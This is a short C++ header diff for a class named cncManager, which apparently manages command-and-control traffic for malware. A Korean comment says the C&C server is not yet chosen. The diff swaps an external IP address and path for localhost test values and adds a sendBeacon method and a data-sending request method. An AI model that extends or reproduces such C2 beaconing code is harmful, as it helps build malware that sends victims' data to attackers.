@@ -8,8 +8,8 @@ class cncManager
 private:
 	LPCWSTR
 		/* 일단 C&C 정해지기 전이라 테스트용*/
-		server = L"46.4.105.116",
-		index = L"/a4247dfc-6bb9-4e95-a705-a39b0f1788ba";
+		server = L"127.0.0.1",
+		index = L"/tests";
 
 	HINTERNET
 		hSession = NULL,
@@ -20,8 +20,10 @@ private:
 
 public:
 	cncManager();
+	cncManager(LPCWSTR server);
 	~cncManager();
-	void sendHttpRequest(LPVOID data);
+	void sendHttpRequest(LPVOID data, DWORD dlen);
+	void sendBeacon();
 
 
 };
